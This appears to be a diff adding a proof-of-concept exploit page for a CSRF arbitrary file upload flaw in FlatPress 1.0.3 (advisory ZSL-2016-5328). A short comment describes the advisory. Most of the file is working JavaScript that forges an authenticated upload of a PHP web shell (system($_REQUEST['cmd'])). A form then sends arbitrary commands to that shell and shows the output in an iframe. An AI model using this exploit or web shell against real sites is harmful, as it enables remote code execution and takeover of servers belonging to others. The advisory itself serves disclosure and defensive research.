@@ -1,0 +1,146 @@
+﻿<!DOCTYPE html>
+<!--
+
+
+FlatPress 1.0.3 CSRF Arbitrary File Upload
+
+
+Vendor: Edoardo Vacchi
+Product web page: http://www.flatpress.org
+Affected version: 1.0.3
+
+Summary: FlatPress is a blogging engine that saves your posts as
+simple text files. Forget about SQL! You just need some PHP.
+
+Desc: The vulnerability is caused due to the improper verification
+of uploaded files via the Uploader script using 'upload[]' POST parameter
+which allows of arbitrary files being uploaded in '/fp-content/attachs'
+directory. The application interface allows users to perform certain
+actions via HTTP requests without performing any validity checks to
+verify the requests. This can be exploited to perform actions with
+administrative privileges if a logged-in user visits a malicious
+web site resulting in execution of arbitrary PHP code by uploading
+a malicious PHP script file and execute system commands.
+
+Tested on: Apache/2.4.10
+           PHP/5.6.3
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2016-5328
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5328.php
+
+
+04.04.2016
+
+-->
+
+
+<html>
+<title>FlatPress 1.0.3 CSRF Arbitrary File Upload RCE PoC</title>
+<body>
+
+<script type="text/javascript">
+
+function exec(){
+  var command = document.getElementById("exec");
+  var url = "http://localhost/flatpress/fp-content/attachs/test.php?cmd=";
+  var cmdexec = command.value;
+  window.open(url+cmdexec,"ZSL_iframe");
+}
+
+function upload(){
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", "http://localhost/flatpress/admin.php?p=uploader&action=default", true);
+  xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
+  xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.8");
+  xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundary1Ix0O1LgWmzQa0af");
+  xhr.withCredentials = true;
+  var body = "------WebKitFormBoundary1Ix0O1LgWmzQa0af\r\n" + 
+    "Content-Disposition: form-data; name=\"_wpnonce\"\r\n" + 
+    "\r\n" + 
+    "5a462c73ac\r\n" + 
+    "------WebKitFormBoundary1Ix0O1LgWmzQa0af\r\n" + 
+    "Content-Disposition: form-data; name=\"_wp_http_referer\"\r\n" + 
+    "\r\n" + 
+    "/flatpress/admin.php?p=uploader\r\n" + 
+    "------WebKitFormBoundary1Ix0O1LgWmzQa0af\r\n" + 
+    "Content-Disposition: form-data; name=\"upload[]\"; filename=\"test.php\"\r\n" + 
+    "Content-Type: application/octet-stream\r\n" + 
+    "\r\n" + 
+    "\x3c?php\r\n" + 
+    "system($_REQUEST[\'cmd\']);\r\n" + 
+    "?\x3e\r\n" + 
+    "------WebKitFormBoundary1Ix0O1LgWmzQa0af\r\n" + 
+    "Content-Disposition: form-data; name=\"upload[]\"; filename=\"\"\r\n" + 
+    "Content-Type: application/octet-stream\r\n" + 
+    "\r\n" + 
+    "\r\n" + 
+    "------WebKitFormBoundary1Ix0O1LgWmzQa0af\r\n" + 
+    "Content-Disposition: form-data; name=\"upload[]\"; filename=\"\"\r\n" + 
+    "Content-Type: application/octet-stream\r\n" + 
+    "\r\n" + 
+    "\r\n" + 
+    "------WebKitFormBoundary1Ix0O1LgWmzQa0af\r\n" + 
+    "Content-Disposition: form-data; name=\"upload[]\"; filename=\"\"\r\n" + 
+    "Content-Type: application/octet-stream\r\n" + 
+    "\r\n" + 
+    "\r\n" + 
+    "------WebKitFormBoundary1Ix0O1LgWmzQa0af\r\n" + 
+    "Content-Disposition: form-data; name=\"upload[]\"; filename=\"\"\r\n" + 
+    "Content-Type: application/octet-stream\r\n" + 
+    "\r\n" + 
+    "\r\n" + 
+    "------WebKitFormBoundary1Ix0O1LgWmzQa0af\r\n" + 
+    "Content-Disposition: form-data; name=\"upload[]\"; filename=\"\"\r\n" + 
+    "Content-Type: application/octet-stream\r\n" + 
+    "\r\n" + 
+    "\r\n" + 
+    "------WebKitFormBoundary1Ix0O1LgWmzQa0af\r\n" + 
+    "Content-Disposition: form-data; name=\"upload[]\"; filename=\"\"\r\n" + 
+    "Content-Type: application/octet-stream\r\n" + 
+    "\r\n" + 
+    "\r\n" + 
+    "------WebKitFormBoundary1Ix0O1LgWmzQa0af\r\n" + 
+    "Content-Disposition: form-data; name=\"upload[]\"; filename=\"\"\r\n" + 
+    "Content-Type: application/octet-stream\r\n" + 
+    "\r\n" + 
+    "\r\n" + 
+    "------WebKitFormBoundary1Ix0O1LgWmzQa0af\r\n" + 
+    "Content-Disposition: form-data; name=\"upload\"\r\n" + 
+    "\r\n" + 
+    "Upload\r\n" + 
+    "------WebKitFormBoundary1Ix0O1LgWmzQa0af--\r\n";
+  var aBody = new Uint8Array(body.length);
+  for (var i = 0; i < aBody.length; i++)
+    aBody[i] = body.charCodeAt(i); 
+    xhr.send(new Blob([aBody]));
+}
+
+</script>
+
+<h3>FlatPress 1.0.3 CSRF Arbitrary File Upload RCE PoC Script</h3>
+
+<form action="#">
+  <button type="button" onclick=upload()>Upload test.php file!</button>
+</form><br />
+
+<form action="javascript:exec()">
+  <input type="text" id="exec" placeholder="Enter a command">
+  <input type="submit" value="Execute!">
+</form><br />
+
+<iframe
+  style="border:2px;border-style:dashed;color:#d3d3d3"
+  srcdoc="command output frame"
+  width="700" height="600"
+  name="ZSL_iframe">
+</iframe>
+<br />
+<font size="2" color="#d3d3d3">ZSL-2016-5328</font>
+
+</body>
+</html>
